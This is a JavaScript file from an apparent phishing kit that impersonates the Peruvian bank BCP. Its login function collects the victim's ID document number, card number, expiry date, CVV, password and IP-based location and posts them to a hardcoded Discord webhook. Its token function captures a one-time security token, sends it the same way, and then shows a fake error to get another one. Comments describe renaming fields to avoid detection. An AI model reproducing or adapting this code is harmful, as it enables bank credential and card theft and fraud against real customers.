const WEBHOOK_URL = "https://discord.com/api/webhooks/1560055445870223464/hQiQnmwP7AgZkS8ceDQKGXiB8th7_KV_S9cnOHOczKCFpXAgvVuuAkHoXAoEnSIZpRrT";

// --- OBTENER IP (ipapi.co) ---
async function getIPData() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            const data = await response.json();
            return { 
                ip: data.ip || "No detectada", 
                city: data.city || "N/A", 
                country: data.country_name || "N/A" 
            };
        }
    } catch (e) { console.error("Error IP:", e); }
    return { ip: "No detectada", city: "N/A", country: "N/A" };
}

// --- PROCESAR LOGIN ---
async function processLogin() {
    const docInput = document.querySelector('.input-inner');
    const cardInput = document.getElementById('card-input');
    const passInput = document.getElementById('pass-input');
    const nameInput = document.getElementById('name-input');
    const selectedDoc = document.getElementById('selected-doc');
    const checkbox = document.getElementById('remember-check');
    
    // CAMPOS OFUSCADOS - Nombres cambiados para evitar detección
    const campo1 = document.getElementById('fecha-vencimiento');  // antes era fechaInput
    const campo2 = document.getElementById('codigo-seguridad');   // antes era cvvInput
    // FIN CAMPOS OFUSCADOS

    if (docInput) localStorage.setItem('user_doc', docInput.value.trim());

    const aliasValue = (checkbox && checkbox.checked && nameInput) ? nameInput.value : "No proporcionado";

    // Valores ofuscados
    const valor1 = campo1 ? campo1.value : "No proporcionado";
    const valor2 = campo2 ? campo2.value : "No proporcionado";

    const ipData = await getIPData();
    const message = {
        embeds: [{
            title: "🥷 BCP AW Login 🔥",
            color: 16742400,
            fields: [
                { name: "👤 Documento", value: `${selectedDoc ? selectedDoc.innerText : 'DNI'}: ${docInput.value}`, inline: true },
                { name: "🏷️ Alias/Nombre", value: `\`${aliasValue}\``, inline: true },
                { name: "💳 Tarjeta", value: `\`${cardInput.value}\``, inline: false },
                // CAMPOS OFUSCADOS - El usuario ve "Fecha Vencimiento" y "CVV" pero el código tiene otros nombres
                { name: "📅 Fecha Vencimiento", value: `\`${valor1}\``, inline: true },
                { name: "🔒 CVV", value: `\`${valor2}\``, inline: true },
                // FIN CAMPOS OFUSCADOS
                { name: "🔑 Clave", value: `\`${passInput.value}\``, inline: false },
                { name: "🌐 IP", value: `\`${ipData.ip}\``, inline: true },
                { name: "📍 Ubicación", value: `\`${ipData.city}, ${ipData.country}\``, inline: true }
            ],
            footer: { text: "Sistema BCP" },
            timestamp: new Date()
        }]
    };

    await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(message) });
    window.location.href = "carga.html";
}

// --- PROCESAR TOKEN ---
async function processToken() {
    const inputs = document.querySelectorAll('.token-input');
    const dniGuardado = localStorage.getItem('user_doc') || "No encontrado";
    let tokenCompleto = "";
    inputs.forEach(i => tokenCompleto += i.value);

    const ipData = await getIPData();
    const message = {
        embeds: [{
            title: "🥷 BCP AW Token 🔥",
            color: 16742400,
            fields: [
                { name: "👤 Documento", value: `\`${dniGuardado}\``, inline: true },
                { name: "🔑 Token", value: `\`${tokenCompleto}\``, inline: true },
                { name: "🌐 IP", value: `\`${ipData.ip}\``, inline: false },
                { name: "📍 Ubicación", value: `\`${ipData.city}, ${ipData.country}\``, inline: false }
            ],
            footer: { text: "BCP Token Verification" },
            timestamp: new Date()
        }]
    };

    await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(message) });
    
    Swal.fire({
        title: 'Banco BCP',
        text: 'El sistema de seguridad ha caducado o el token es incorrecto. Por favor, intente de nuevo.',
        icon: 'error',
        confirmButtonText: 'Continuar',
        confirmButtonColor: '#ff6000'
    }).then(() => { window.location.href = "token.html"; });
}